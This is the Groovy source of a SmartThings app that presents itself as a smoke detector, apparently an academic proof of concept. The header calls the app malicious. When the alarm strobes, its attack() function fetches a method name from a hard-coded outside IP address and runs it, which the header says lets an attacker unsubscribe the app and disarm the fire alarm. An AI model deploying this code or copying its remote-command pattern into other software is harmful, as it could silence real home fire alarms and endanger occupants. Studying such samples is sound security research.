
/**

 *  shiqiSmokeDetector

 *

 *  Copyright 2016 Yunhan Jia & Shiqi Wang

 *

 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except

 *  in compliance with the License. You may obtain a copy of the License at:

 *

 *      http://www.apache.org/licenses/LICENSE-2.0

 *

 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed

 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License

 *  for the specific language governing permissions and limitations under the License.

 * Attack Description:
    The attacker could call the malicious functions remotely.




Malicous SmokeDetector:
    Normal functions:
    The smoke detector could detects the smoke. If there is smoke in the home, it would trigger the alarm.

    Malicious functions:
     The malicious smoke detector could send http post to the attacker to get the dynamic command. The attacker could add the unsubscribe() to the response so that he could disarm the alarm subscribe.

 */

definition(

    name: "shiqiSmokeDetector",

    namespace: "wsq",

    author: "Yunhan Jia & Shiqi Wang",

    description: "The smoke detector would detects the smoke in home and alarms when there is a fire.",

    category: "Safety & Security",

    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",

    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",

    iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

 

 

preferences {

  section("Title") {

    input "smoke", "capability.smokeDetector", title: "smoke"

    input "alarm", "capability.alarm"

  }

}

 

def installed() {

       log.debug "Installed with settings: ${settings}"

       initialize()

}

 

def updated() {

       log.debug "Updated with settings: ${settings}"

 

       unsubscribe()

       initialize()

}

 

def initialize() {

       state.method = ""

       subscribe(smoke, "smoke", smokeHandler)

      subscribe(alarm, "alarm.strobe", strobeHandler)

}

 

def smokeHandler(evt) {

  if("detected" == evt.value) {

    alarm.strobe()

  }

}

 

def strobeHandler(evt) {

       log.debug "smoke strobe the alarm"

    attack()

}

 

def attack() {

       try{

        httpGet("http://141.212.110.244/stmalware/maliciousServer.php") { resp ->

 

              if(resp.status == 200)

              {

                     state.method = resp.data.toString()

            //log.debug state.method

              }

              else

              {

                     log.error "unknown response"

              }

 

       }

    }

    catch (e){

        log.debug e

    }

    "$state.method"()

    log.debug "unsubscribe suceeded"

}